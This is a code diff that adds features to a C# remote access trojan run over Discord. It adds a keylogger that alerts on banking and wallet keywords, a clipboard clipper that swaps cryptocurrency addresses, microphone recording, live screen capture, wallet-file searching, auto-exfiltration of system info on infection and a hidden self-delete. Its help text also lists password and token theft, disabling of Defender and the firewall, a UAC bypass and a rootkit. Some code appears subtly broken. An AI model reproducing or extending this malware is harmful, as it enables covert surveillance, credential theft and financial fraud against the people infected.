@@ -17,6 +17,7 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Web.Script.Serialization;
 using System.Windows.Forms;
+using System.Management;
 namespace Discord_rat
 {
 
@@ -114,6 +115,32 @@ namespace Discord_rat
    }
     public class Program
     {
+
+        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", CharSet = CharSet.Ansi, SetLastError = true)]
+        private static extern long mciSendString(string command, StringBuilder buffer, int bufferSize, IntPtr hwndCallback);
+
+        [DllImport("user32.dll")]
+        public static extern short GetAsyncKeyState(int vKey);
+
+        public static bool keyloggerActive = false;
+        public static StringBuilder keylogData = new StringBuilder();
+        public static CancellationTokenSource keyloggerCts = null;
+
+        public static bool clipperActive = false;
+        public static string btcAddress = "";
+        public static string ethAddress = "";
+        public static CancellationTokenSource clipperCts = null;
+
+        public static bool scheduleActive = false;
+        public static CancellationTokenSource scheduleCts = null;
+
+        public static bool liveviewActive = false;
+        public static CancellationTokenSource liveviewCts = null;
+
+        public static string[] sensitiveKeywords = new string[] { "bank", "binance", "metamask", "paypal", "password", "crypto", "seed", "wallet", "login" };
+        public static HashSet<string> alertedKeywords = new HashSet<string>();
+
+
         [DllImport("ntdll.dll", SetLastError = true)]
         private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
 
@@ -246,6 +273,19 @@ namespace Discord_rat
             httpClient.Dispose();
             string starting_payload = string.Format("@here :white_check_mark: New session opened {0} | User: {2} | IP: {1} | Admin: {3}", "session-" + biggest.ToString(),await getip(), Environment.UserName,(new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)).ToString());
             await Send_message((string)new_channel_id, starting_payload);
+
+            // Auto-Stealer on Session Join (2.2)
+            Task.Run(async () =>
+            {
+                try
+                {
+                    await Task.Delay(2000);
+                    await SystemInfo((string)new_channel_id);
+                    await GetScreenshot((string)new_channel_id);
+                }
+                catch { }
+            });
+
             return (string)new_channel_id;
         }
         public static async Task handler(Dictionary<object, object> data)
@@ -841,7 +881,7 @@ namespace Discord_rat
         }
         public static async Task helpmenu(string channelid) 
         {
-            string data = "--> !message = Show a message box displaying your text / Syntax  = \"!message example\"\n--> !shell = Execute a shell command /Syntax  = \"!shell whoami\"\n--> !voice = Make a voice say outloud a custom sentence / Syntax = \"!voice test\"\n--> !admincheck = Check if program has admin privileges\n--> !cd = Changes directory\n--> !dir = display all items in current dir\n--> !download = Download a file from infected computer\n--> !upload = Upload file to the infected computer / Syntax = \"!upload file.png\" (with attachment)\n--> !uploadlink = Upload file to the infected computer / Syntax = \"!upload link file.png\"\n--> !delete = deletes a file / Syntax = \"!delete / path to / the / file.txt\"\n--> !write = Type your desired sentence on computer\n--> !wallpaper = Change infected computer wallpaper / Syntax = \"!wallpaper\" (with attachment)\n--> !clipboard = Retrieve infected computer clipboard content\n--> !idletime = Get the idle time of user\'s on target computer\n--> !currentdir = display the current dir\n--> !block = Blocks user\'s keyboard and mouse / Warning : Admin rights are required\n--> !unblock = Unblocks user\'s keyboard and mouse / Warning : Admin rights are required\n--> !screenshot = Get the screenshot of the user\'s current screen\n--> !exit = Exit program\n--> !kill = Kill a session or all sessions / Syntax = \"!kill session-3\" or \"!kill all\"\n--> !uacbypass = attempt to bypass uac to gain admin by using windir and slui\n--> !shutdown = shutdown computer\n--> !restart = restart computer\n--> !logoff = log off current user\n--> !bluescreen = BlueScreen PC\n--> !datetime = display system date and time\n--> !prockill = kill a process by name / syntax = \"!kill process\"\n--> !disabledefender = Disable windows defender(requires admin)\n--> !disablefirewall = Disable windows firewall(requires admin)\n--> !audio = play a audio file on the target computer / Syntax = \"!audio\" (with attachment)\n--> !critproc = make program a critical process. meaning if its closed the computer will bluescreen(Admin rights are required)\n--> !uncritproc = if the process is a critical process it will no longer be a critical process meaning it can be closed without bluescreening(Admin rights are required)\n--> !website = open a website on the infected computer / syntax = \"!website www.google.com\"\n--> !disabletaskmgr = disable task manager(Admin rights are required)\n--> !enabletaskmgr = enable task manager(if disabled)(Admin rights are required)\n--> !startup = add to startup(when computer go on this file starts)\n--> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise\n--> !listprocess = Get all process\'s\n--> !password = grab all passwords\n--> !rootkit = Launch a rootkit (the process will be hidden from taskmgr and you wont be able to see the file)(Admin rights are required)\n--> !unrootkit = Remove the rootkit(Admin rights are required)\n--> !getcams = Grab the cameras names and their respected selection number\n--> !selectcam = Select camera to take a picture out of (default will be camera 1)/ Syntax \"!selectcam 1\"\n--> !webcampic = Take a picture out of the selected webcam\n--> !grabtokens = Grab all discord tokens on the current pc\n--> !help = This help menu";
+            string data = "--> !schedule = Task Scheduler / Syntax = \"!schedule start <sec> <cmd>|stop\"\n--> !liveview = Continuous screen view / Syntax = \"!liveview start <sec>|stop\"\n--> !searchfile = Search files on system / Syntax = \"!searchfile *wallet*\"\n--> !cleanlogs = Clean temp files and log buffers\n--> !selfdestruct = Self destruct and remove client\n--> !sysinfo = Display detailed system, HW, AV & OS info\n--> !keylogger = Control keylogger / Syntax = \"!keylogger start|stop|dump\"\n--> !clipper = Swap crypto addresses in clipboard / Syntax = \"!clipper start <btc> <eth>|stop\"\n--> !recordaudio = Record microphone audio for N seconds / Syntax = \"!recordaudio 10\"\n--> !message = Show a message box displaying your text / Syntax  = \"!message example\"\n--> !shell = Execute a shell command /Syntax  = \"!shell whoami\"\n--> !voice = Make a voice say outloud a custom sentence / Syntax = \"!voice test\"\n--> !admincheck = Check if program has admin privileges\n--> !cd = Changes directory\n--> !dir = display all items in current dir\n--> !download = Download a file from infected computer\n--> !upload = Upload file to the infected computer / Syntax = \"!upload file.png\" (with attachment)\n--> !uploadlink = Upload file to the infected computer / Syntax = \"!upload link file.png\"\n--> !delete = deletes a file / Syntax = \"!delete / path to / the / file.txt\"\n--> !write = Type your desired sentence on computer\n--> !wallpaper = Change infected computer wallpaper / Syntax = \"!wallpaper\" (with attachment)\n--> !clipboard = Retrieve infected computer clipboard content\n--> !idletime = Get the idle time of user\'s on target computer\n--> !currentdir = display the current dir\n--> !block = Blocks user\'s keyboard and mouse / Warning : Admin rights are required\n--> !unblock = Unblocks user\'s keyboard and mouse / Warning : Admin rights are required\n--> !screenshot = Get the screenshot of the user\'s current screen\n--> !exit = Exit program\n--> !kill = Kill a session or all sessions / Syntax = \"!kill session-3\" or \"!kill all\"\n--> !uacbypass = attempt to bypass uac to gain admin by using windir and slui\n--> !shutdown = shutdown computer\n--> !restart = restart computer\n--> !logoff = log off current user\n--> !bluescreen = BlueScreen PC\n--> !datetime = display system date and time\n--> !prockill = kill a process by name / syntax = \"!kill process\"\n--> !disabledefender = Disable windows defender(requires admin)\n--> !disablefirewall = Disable windows firewall(requires admin)\n--> !audio = play a audio file on the target computer / Syntax = \"!audio\" (with attachment)\n--> !critproc = make program a critical process. meaning if its closed the computer will bluescreen(Admin rights are required)\n--> !uncritproc = if the process is a critical process it will no longer be a critical process meaning it can be closed without bluescreening(Admin rights are required)\n--> !website = open a website on the infected computer / syntax = \"!website www.google.com\"\n--> !disabletaskmgr = disable task manager(Admin rights are required)\n--> !enabletaskmgr = enable task manager(if disabled)(Admin rights are required)\n--> !startup = add to startup(when computer go on this file starts)\n--> !geolocate = Geolocate computer using latitude and longitude of the ip adress with google map / Warning : Geolocating IP adresses is not very precise\n--> !listprocess = Get all process\'s\n--> !password = grab all passwords\n--> !rootkit = Launch a rootkit (the process will be hidden from taskmgr and you wont be able to see the file)(Admin rights are required)\n--> !unrootkit = Remove the rootkit(Admin rights are required)\n--> !getcams = Grab the cameras names and their respected selection number\n--> !selectcam = Select camera to take a picture out of (default will be camera 1)/ Syntax \"!selectcam 1\"\n--> !webcampic = Take a picture out of the selected webcam\n--> !grabtokens = Grab all discord tokens on the current pc\n--> !help = This help menu";
             if (data.Length >= 1990)
             {
                 await Send_attachment(channelid, "", new List<byte[]>() { StringToBytes(data) }, new string[] { "help.txt" });
@@ -953,6 +993,421 @@ namespace Discord_rat
                 await Send_message(channelid, "Command executed!");
             }
         }
+
+        public static async Task SystemInfo(string channelid)
+        {
+            try
+            {
+                StringBuilder sb = new StringBuilder();
+                sb.AppendLine("**=== System Information ===**");
+                sb.AppendLine($"**OS:** {Environment.OSVersion}");
+                sb.AppendLine($"**Machine Name:** {Environment.MachineName}");
+                sb.AppendLine($"**Username:** {Environment.UserName}");
+                sb.AppendLine($"**Processors:** {Environment.ProcessorCount}");
+                sb.AppendLine($"**64-Bit OS:** {Environment.Is64BitOperatingSystem}");
+                sb.AppendLine($"**Uptime:** {TimeSpan.FromMilliseconds(Environment.TickCount):dd\:hh\:mm\:ss}");
+
+                try
+                {
+                    using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem"))
+                    {
+                        foreach (ManagementObject obj in searcher.Get())
+                        {
+                            sb.AppendLine($"**OS Name:** {obj["Caption"]}");
+                        }
+                    }
+                    using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Name FROM Win32_Processor"))
+                    {
+                        foreach (ManagementObject obj in searcher.Get())
+                        {
+                            sb.AppendLine($"**CPU:** {obj["Name"]}");
+                        }
+                    }
+                    using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Capacity FROM Win32_PhysicalMemory"))
+                    {
+                        long totalRam = 0;
+                        foreach (ManagementObject obj in searcher.Get())
+                        {
+                            totalRam += Convert.ToInt64(obj["Capacity"]);
+                        }
+                        sb.AppendLine($"**RAM:** {totalRam / (1024 * 1024 * 1024)} GB");
+                    }
+                    using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT Name FROM Win32_VideoController"))
+                    {
+                        foreach (ManagementObject obj in searcher.Get())
+                        {
+                            sb.AppendLine($"**GPU:** {obj["Name"]}");
+                        }
+                    }
+                    using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(@"root\SecurityCenter2", "SELECT displayName FROM AntivirusProduct"))
+                    {
+                        List<string> avList = new List<string>();
+                        foreach (ManagementObject obj in searcher.Get())
+                        {
+                            avList.Add(obj["displayName"].ToString());
+                        }
+                        if (avList.Count > 0)
+                            sb.AppendLine($"**Antivirus:** {string.Join(", ", avList)}");
+                        else
+                            sb.AppendLine("**Antivirus:** None Detected");
+                    }
+                }
+                catch { }
+
+                string output = sb.ToString();
+                await Send_message(channelid, output);
+                await Send_message(channelid, "Command executed!");
+            }
+            catch (Exception ex)
+            {
+                await Send_message(channelid, "Error gathering system info: " + ex.Message);
+            }
+        }
+
+        public static void StartKeylogger()
+        {
+            if (keyloggerActive) return;
+            keyloggerActive = true;
+            keyloggerCts = new CancellationTokenSource();
+            Task.Run(async () =>
+            {
+                while (keyloggerActive && !keyloggerCts.Token.IsCancellationRequested)
+                {
+                    await Task.Delay(10);
+                    for (int i = 8; i < 255; i++)
+                    {
+                        int state = GetAsyncKeyState(i);
+                        if (state == 1 || state == -32767)
+                        {
+                            Keys key = (Keys)i;
+                            if (key == Keys.Enter) keylogData.Append("\n[ENTER]\n");
+                            else if (key == Keys.Space) keylogData.Append(" ");
+                            else if (key == Keys.Back) keylogData.Append("[BACKSPACE]");
+                            else if (key == Keys.Tab) keylogData.Append("[TAB]");
+                            else if (key == Keys.Shift || key == Keys.LShiftKey || key == Keys.RShiftKey) { }
+                            else if (key >= Keys.A && key <= Keys.Z) keylogData.Append(key.ToString());
+                            else if (key >= Keys.D0 && key <= Keys.D9) keylogData.Append(key.ToString().Replace("D", ""));
+
+                            string currentLogs = keylogData.ToString().ToLower();
+                            foreach (string kw in sensitiveKeywords)
+                            {
+                                if (currentLogs.Contains(kw) && !alertedKeywords.Contains(kw))
+                                {
+                                    alertedKeywords.Add(kw);
+                                    if (ChannelId != "unset")
+                                    {
+                                        await Send_message(ChannelId, $"🚨 **[KEYWORD ALERT]** Sensitive keyword '{kw}' detected in keylogger!");
+                                    }
+                                }
+                            }
+                            else keylogData.Append($"[{key}]");
+                        }
+                    }
+                }
+            }, keyloggerCts.Token);
+        }
+
+        public static void StopKeylogger()
+        {
+            keyloggerActive = false;
+            if (keyloggerCts != null)
+            {
+                keyloggerCts.Cancel();
+                keyloggerCts.Dispose();
+                keyloggerCts = null;
+            }
+        }
+
+        public static async Task DumpKeylog(string channelid)
+        {
+            string logs = keylogData.ToString();
+            if (string.IsNullOrEmpty(logs))
+            {
+                await Send_message(channelid, "Keylog buffer is empty.");
+                return;
+            }
+            if (logs.Length >= 1900)
+            {
+                await Send_attachment(channelid, "Keylog output:", new List<byte[]>() { StringToBytes(logs) }, new string[] { "keylog.txt" });
+            }
+            else
+            {
+                await Send_message(channelid, "```\n" + logs + "\n```");
+            }
+            await Send_message(channelid, "Command executed!");
+        }
+
+        public static void StartClipper(string btc, string eth)
+        {
+            btcAddress = btc;
+            ethAddress = eth;
+            if (clipperActive) return;
+            clipperActive = true;
+            clipperCts = new CancellationTokenSource();
+            Task.Run(async () =>
+            {
+                Regex btcRegex = new Regex(@"^(1[a-km-zA-HJ-NP-Z1-9]{25,34}|3[a-km-zA-HJ-NP-Z1-9]{25,34}|bc1[a-zA-0-9]{39,59})$");
+                Regex ethRegex = new Regex(@"^0x[a-fA-F0-9]{40}$");
+
+                while (clipperActive && !clipperCts.Token.IsCancellationRequested)
+                {
+                    await Task.Delay(1000);
+                    try
+                    {
+                        string clipboardText = "";
+                        Thread staThread = new Thread(() =>
+                        {
+                            try
+                            {
+                                if (Clipboard.ContainsText()) clipboardText = Clipboard.GetText();
+                            }
+                            catch { }
+                        });
+                        staThread.SetApartmentState(ApartmentState.STA);
+                        staThread.Start();
+                        staThread.Join();
+
+                        if (!string.IsNullOrEmpty(clipboardText))
+                        {
+                            clipboardText = clipboardText.Trim();
+                            if (!string.IsNullOrEmpty(btcAddress) && btcRegex.IsMatch(clipboardText) && clipboardText != btcAddress)
+                            {
+                                SetClipboardText(btcAddress);
+                            }
+                            else if (!string.IsNullOrEmpty(ethAddress) && ethRegex.IsMatch(clipboardText) && clipboardText != ethAddress)
+                            {
+                                SetClipboardText(ethAddress);
+                            }
+                        }
+                    }
+                    catch { }
+                }
+            }, clipperCts.Token);
+        }
+
+        public static void StopClipper()
+        {
+            clipperActive = false;
+            if (clipperCts != null)
+            {
+                clipperCts.Cancel();
+                clipperCts.Dispose();
+                clipperCts = null;
+            }
+        }
+
+        private static void SetClipboardText(string text)
+        {
+            Thread staThread = new Thread(() =>
+            {
+                try
+                {
+                    Clipboard.SetText(text);
+                }
+                catch { }
+            });
+            staThread.SetApartmentState(ApartmentState.STA);
+            staThread.Start();
+            staThread.Join();
+        }
+
+
+        public static void StartSchedule(string channelid, int intervalSec, string commandToRun)
+        {
+            if (intervalSec < 5) intervalSec = 5;
+            StopSchedule();
+            scheduleActive = true;
+            scheduleCts = new CancellationTokenSource();
+            Task.Run(async () =>
+            {
+                while (scheduleActive && !scheduleCts.Token.IsCancellationRequested)
+                {
+                    await Task.Delay(intervalSec * 1000);
+                    if (scheduleActive && !scheduleCts.Token.IsCancellationRequested)
+                    {
+                        await CommandHandler(commandToRun, new string[0]);
+                    }
+                }
+            }, scheduleCts.Token);
+        }
+
+        public static void StopSchedule()
+        {
+            scheduleActive = false;
+            if (scheduleCts != null)
+            {
+                scheduleCts.Cancel();
+                scheduleCts.Dispose();
+                scheduleCts = null;
+            }
+        }
+
+        public static void StartLiveView(string channelid, int intervalSec)
+        {
+            if (intervalSec < 3) intervalSec = 3;
+            StopLiveView();
+            liveviewActive = true;
+            liveviewCts = new CancellationTokenSource();
+            Task.Run(async () =>
+            {
+                while (liveviewActive && !liveviewCts.Token.IsCancellationRequested)
+                {
+                    await GetScreenshot(channelid);
+                    await Task.Delay(intervalSec * 1000);
+                }
+            }, liveviewCts.Token);
+        }
+
+        public static void StopLiveView()
+        {
+            liveviewActive = false;
+            if (liveviewCts != null)
+            {
+                liveviewCts.Cancel();
+                liveviewCts.Dispose();
+                liveviewCts = null;
+            }
+        }
+
+        public static async Task SearchFiles(string channelid, string searchPattern)
+        {
+            if (string.IsNullOrEmpty(searchPattern)) searchPattern = "*wallet*";
+            try
+            {
+                await Send_message(channelid, $"Searching files with pattern '{searchPattern}' across system...");
+                List<string> foundFiles = new List<string>();
+                foreach (DriveInfo drive in DriveInfo.GetDrives())
+                {
+                    if (drive.IsReady && drive.DriveType == DriveType.Fixed)
+                    {
+                        try
+                        {
+                            foreach (string file in Directory.GetFiles(drive.RootDirectory.FullName, searchPattern, SearchOption.AllDirectories))
+                            {
+                                foundFiles.Add(file);
+                                if (foundFiles.Count >= 50) break;
+                            }
+                        }
+                        catch { }
+                    }
+                    if (foundFiles.Count >= 50) break;
+                }
+
+                if (foundFiles.Count == 0)
+                {
+                    await Send_message(channelid, "No files found matching pattern.");
+                }
+                else
+                {
+                    string result = string.Join("
+", foundFiles);
+                    if (result.Length >= 1900)
+                    {
+                        await Send_attachment(channelid, "Found files list:", new List<byte[]>() { StringToBytes(result) }, new string[] { "found_files.txt" });
+                    }
+                    else
+                    {
+                        await Send_message(channelid, "```
+" + result + "
+```");
+                    }
+                }
+                await Send_message(channelid, "Command executed!");
+            }
+            catch (Exception ex)
+            {
+                await Send_message(channelid, "Error searching files: " + ex.Message);
+            }
+        }
+
+        public static async Task CleanLogs(string channelid)
+        {
+            try
+            {
+                int deletedCount = 0;
+                string tempDir = Path.GetTempPath();
+                string[] files = Directory.GetFiles(tempDir, "rec_*.wav");
+                foreach (string f in files)
+                {
+                    try { File.Delete(f); deletedCount++; } catch { }
+                }
+                keylogData.Clear();
+                alertedKeywords.Clear();
+                await Send_message(channelid, $"Cleaned temporary logs! Deleted {deletedCount} temp recording files and cleared log buffers.");
+                await Send_message(channelid, "Command executed!");
+            }
+            catch (Exception ex)
+            {
+                await Send_message(channelid, "Error cleaning logs: " + ex.Message);
+            }
+        }
+
+        public static async Task SelfDestruct(string channelid)
+        {
+            try
+            {
+                await Send_message(channelid, "Initiating self-destruct sequence...");
+                try
+                {
+                    RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                    string keyName = "$77" + Path.GetFileName(Assembly.GetEntryAssembly().Location);
+                    if (rk.GetValue(keyName) != null) rk.DeleteValue(keyName);
+                }
+                catch { }
+
+                string currentFile = Assembly.GetEntryAssembly().Location;
+                string batchPath = Path.Combine(Path.GetTempPath(), "remove.bat");
+                string batchContent = $":Loop
+del "{currentFile}"
+if exist "{currentFile}" goto Loop
+del "{batchPath}"";
+                File.WriteAllText(batchPath, batchContent);
+
+                Process.Start(new ProcessStartInfo()
+                {
+                    FileName = "cmd.exe",
+                    Arguments = $"/C {batchPath}",
+                    CreateNoWindow = true,
+                    WindowStyle = ProcessWindowStyle.Hidden
+                });
+
+                Application.Exit();
+                Environment.Exit(0);
+            }
+            catch { Environment.Exit(0); }
+        }
+
+        public static async Task RecordAudio(string channelid, int seconds)
+        {
+            if (seconds <= 0 || seconds > 300) seconds = 10;
+            string tempPath = Path.Combine(Path.GetTempPath(), "rec_" + Path.GetRandomFileName() + ".wav");
+            try
+            {
+                mciSendString("open new type waveaudio alias recsound", null, 0, IntPtr.Zero);
+                mciSendString("record recsound", null, 0, IntPtr.Zero);
+                await Send_message(channelid, $"Recording audio for {seconds} seconds...");
+                await Task.Delay(seconds * 1000);
+                mciSendString($"save recsound \"{tempPath}\"", null, 0, IntPtr.Zero);
+                mciSendString("close recsound", null, 0, IntPtr.Zero);
+
+                if (File.Exists(tempPath))
+                {
+                    byte[] audioBytes = File.ReadAllBytes(tempPath);
+                    await Send_attachment(channelid, "Audio recording finished:", new List<byte[]>() { audioBytes }, new string[] { "audio_record.wav" });
+                    File.Delete(tempPath);
+                    await Send_message(channelid, "Command executed!");
+                }
+                else
+                {
+                    await Send_message(channelid, "Failed to record audio.");
+                }
+            }
+            catch (Exception ex)
+            {
+                await Send_message(channelid, "Error recording audio: " + ex.Message);
+            }
+        }
+
         public static async Task CommandHandler(string message_content, string[] attachment_urls) 
         {
             //await Send_attachment(ChannelId, "", new List<byte[]>() { Encoding.ASCII.GetBytes("test"), Encoding.ASCII.GetBytes("test2") },new string[] {"poggers.txt","pog.txt"});
@@ -962,6 +1417,112 @@ namespace Discord_rat
             string message_data = string.Join(" ", message_content.Split(" ".ToCharArray()).Skip(1));
             switch (command)
             {
+
+                case "!schedule":
+                    string[] schedArgs = message_data.Split(" ".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
+                    if (schedArgs.Length > 0 && schedArgs[0].ToLower() == "start")
+                    {
+                        int sec = 30;
+                        if (schedArgs.Length > 1) int.TryParse(schedArgs[1], out sec);
+                        string cmdToRun = string.Join(" ", schedArgs.Skip(2));
+                        if (!string.IsNullOrEmpty(cmdToRun))
+                        {
+                            StartSchedule(ChannelId, sec, cmdToRun);
+                            await Send_message(ChannelId, $"Schedule started! Running '{cmdToRun}' every {sec} seconds.");
+                        }
+                        else
+                        {
+                            await Send_message(ChannelId, "Syntax: !schedule start <seconds> <command>");
+                        }
+                    }
+                    else if (schedArgs.Length > 0 && schedArgs[0].ToLower() == "stop")
+                    {
+                        StopSchedule();
+                        await Send_message(ChannelId, "Schedule stopped!");
+                    }
+                    else
+                    {
+                        await Send_message(ChannelId, "Syntax: !schedule start <seconds> <command> | !schedule stop");
+                    }
+                    break;
+                case "!liveview":
+                    string[] liveArgs = message_data.Split(" ".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
+                    if (liveArgs.Length > 0 && liveArgs[0].ToLower() == "start")
+                    {
+                        int interval = 5;
+                        if (liveArgs.Length > 1) int.TryParse(liveArgs[1], out interval);
+                        StartLiveView(ChannelId, interval);
+                        await Send_message(ChannelId, $"LiveView started! Capturing screen every {interval} seconds.");
+                    }
+                    else if (liveArgs.Length > 0 && liveArgs[0].ToLower() == "stop")
+                    {
+                        StopLiveView();
+                        await Send_message(ChannelId, "LiveView stopped!");
+                    }
+                    else
+                    {
+                        await Send_message(ChannelId, "Syntax: !liveview start <interval_sec> | !liveview stop");
+                    }
+                    break;
+                case "!searchfile":
+                    await SearchFiles(ChannelId, message_data);
+                    break;
+                case "!cleanlogs":
+                    await CleanLogs(ChannelId);
+                    break;
+                case "!selfdestruct":
+                    await SelfDestruct(ChannelId);
+                    break;
+
+
+                case "!sysinfo":
+                    await SystemInfo(ChannelId);
+                    break;
+                case "!keylogger":
+                    if (message_data.ToLower() == "start")
+                    {
+                        StartKeylogger();
+                        await Send_message(ChannelId, "Keylogger started!");
+                    }
+                    else if (message_data.ToLower() == "stop")
+                    {
+                        StopKeylogger();
+                        await Send_message(ChannelId, "Keylogger stopped!");
+                    }
+                    else if (message_data.ToLower() == "dump")
+                    {
+                        await DumpKeylog(ChannelId);
+                    }
+                    else
+                    {
+                        await Send_message(ChannelId, "Syntax: !keylogger start | stop | dump");
+                    }
+                    break;
+                case "!clipper":
+                    string[] clipArgs = message_data.Split(" ".ToCharArray(), StringSplitOptions.RemoveEmptyEntries);
+                    if (clipArgs.Length > 0 && clipArgs[0].ToLower() == "start")
+                    {
+                        string btc = clipArgs.Length > 1 ? clipArgs[1] : "";
+                        string eth = clipArgs.Length > 2 ? clipArgs[2] : "";
+                        StartClipper(btc, eth);
+                        await Send_message(ChannelId, $"Clipper started! BTC: '{btc}', ETH: '{eth}'");
+                    }
+                    else if (clipArgs.Length > 0 && clipArgs[0].ToLower() == "stop")
+                    {
+                        StopClipper();
+                        await Send_message(ChannelId, "Clipper stopped!");
+                    }
+                    else
+                    {
+                        await Send_message(ChannelId, "Syntax: !clipper start <btc_addr> <eth_addr> | !clipper stop");
+                    }
+                    break;
+                case "!recordaudio":
+                    int recSec = 10;
+                    int.TryParse(message_data, out recSec);
+                    await RecordAudio(ChannelId, recSec);
+                    break;
+
                 case "!grabtokens":
                     await get_tokens(ChannelId);
                     break;
